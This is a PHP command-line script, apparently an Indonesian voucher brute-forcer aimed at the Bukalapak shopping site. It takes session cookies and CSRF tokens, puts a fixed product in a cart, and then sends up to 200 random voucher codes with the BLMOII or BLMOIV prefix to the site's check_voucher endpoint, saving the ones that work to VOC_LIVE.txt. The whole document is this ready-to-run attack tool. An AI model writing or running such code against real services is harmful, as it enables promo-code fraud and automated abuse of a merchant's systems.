<?php
// @haqny18
if(!defined(STDIN))
	define('STDIN',fopen("php://stdin","r"));
error_reporting(0);ini_set('display_errors', 0);
set_time_limit(0);ignore_user_abort(1);
class BL {

	const API_URL	= 'https://www.bukalapak.com/';
	const OFFSET 	= 	[
							'BLMOII',
							'BLMOIV'
						];
	const PRODUCTS	=	[
							['seller_id' => 13982887, 'product_id' => 455477033, 'sku_id' => 386096561],
							['seller_id' => 13982887, 'product_id' => 171012667, 'sku_id' => 155566745],
							['seller_id' => 4190818, 'product_id' => 478638111, 'sku_id' => 470754496],
							['seller_id' => 18614047, 'product_id' => 457504744, 'sku_id' => 388124710],
						];
	function __construct(){
		print "\033[0;36mOFFSET =\n[1]. BLMOII\n[2]. BLMOIV\n\npilih salah satu: \033[0m";
		$offset = (int)fgets(STDIN) == 1 ? 0 : 1;
		print "\033[0;36mJUMLAH EKSEKUSI: \033[0m";
		$jumlah = (int)fgets(STDIN);
		print "\033[0;36m-- SEDANG DALAM PROSES --\n\033[0m";
		$ekse = $this->postEksekusi($this->getResources(), $jumlah, $offset);
		print "\033[0;36m-- SELESAI --\n\033[0m";
	}

	function request($endpoint = '', $cookie = null, $postdata = null, $additional_headers = []){
        $headers = 	[
			            'Accept-Encoding: gzip, deflate',
			            'X-NewRelic-ID: VQcDWF9ADgIJVVBQ',
			            'Origin: '.self::API_URL,
			            'Accept-Language: en-US,en;q=0.9'
        			];
		$ch = curl_init(self::API_URL.$endpoint);
		curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 90);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		if(!empty($cookie))
			curl_setopt($ch, CURLOPT_COOKIE, $cookie);
        if (!empty($postdata)) {
			$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
        }
        if(is_array($additional_headers)&&!empty($additional_headers))
        	$headers = array_merge($additional_headers, $headers);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $resp = curl_exec($ch);
        $header_len = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $header = substr($resp, 0, $header_len);
        $body = substr($resp, $header_len);
        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);$error = curl_error($ch);
		curl_close($ch);
		return [$header, (preg_match('#Content-Encoding#i', $header) ? gzinflate(substr($body, 10)) : $body), $httpcode, $error];
	}

	function getRandomString($length = 10) {
	    return substr(str_shuffle(str_repeat($x='0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
	}

	private function getResources(){
		$req = $this->request();
		preg_match_all('#Set-Cookie: (.*?);#',$req[0],$d);$cookie='';for($o=0;$o<count($d[0]);$o++)$cookie.=$d[1][$o].";";
		$product = self::PRODUCTS[array_rand(self::PRODUCTS)];
		preg_match('#name="authenticity_token" id="authenticity_token" value="(.*?)"#', $req[1], $auth);
		$this->request 	('cart/carts/add_product?button_type=direct_checkout&express_checkout=true', $cookie, 
																											http_build_query(['utf8' => '%E2%9C%93',
																											 'authenticity_token' => trim($auth[1]),
																											 'item[product_id]' => $product['product_id'], 
																											 'item[product_sku_id]' => $product['sku_id'], 
																											 'item[seller_id]' => $product['seller_id'], 
																											 'item[quantity]' => 1, 
																											 'from' => 'omnisearch'])
						);
		$req = $this->request('payment/purchases/new?product_id='.$product['product_id'].'&product_sku_id='.$product['sku_id'].'&seller_ids=%5B'.$product['seller_id'].'%5D', $cookie);
		preg_match("#data-price='(.*?)'#", $req[1], $price);preg_match('#name="csrf-token" content="(.*?)"#', $req[1], $csrf);
		return ['cookie' => $cookie, 'product' => array_merge(['price' => (int)$price[1]], $product), 'csrf' => $csrf[1]];
	}

	private function postEksekusi($data, $num, $offset = 0){
		if(is_array($data)&&!empty($data)){
			$num = $num > 200 ? 200 : $num;
			if (ob_get_level() == 0) ob_start();
			$headers = 	[
							'Content-Type: application/json',
							'X-CSRF-Token: '.$data['csrf'],
							'Accept: */*',
							'X-Requested-With: XMLHttpRequest'
						];
			$fp = fopen('VOC_LIVE.txt', 'a');
			for($i=0;$i<$num;$i++){
				$voc = self::OFFSET[$offset].$this->getRandomString(4);
				$x = $this->request('payment/purchases/check_voucher.json', $data['cookie'], json_encode(['payment_invoice' => ['transactions' => [['address' => ['province' => '', 'city' => ''], 'amount' => $data['product']['price'], 'courier_cost' => 0, 'insurance_cost' => 0, 'agent_commission_amount' => 0, 'courier' => null, 'seller_id' => $data['product']['seller_id'], 'retarget_discount_amount' => 0, 'cart_item_ids' => [$data['product']['product_id']]]]], 'payment_details' => ['virtual_account_type' => ''], 'voucher_code' => $voc]), $headers);
				$nums = $i+1;
				if($x[2]==200){
					$w = json_decode($x[1]);
					if($w->message=='Voucher hanya berlaku untuk transaksi di Aplikasi Android Bukalapak dan Aplikasi iOS Bukalapak')
						fwrite($fp, "[ $voc ] -- LIVE ".date('d/m/Y H:i')."\n");
					print "[$nums] $voc =|> [ ".$w->message." ]\n";
				}else
					print "[$nums] $voc =|> [ INTERNAL SERVER ERROR - $x[3] ]\n";
				ob_flush();
        		flush();
			}
			fclose($fp);
			ob_end_flush();
		}
	}

}

$run = new BL();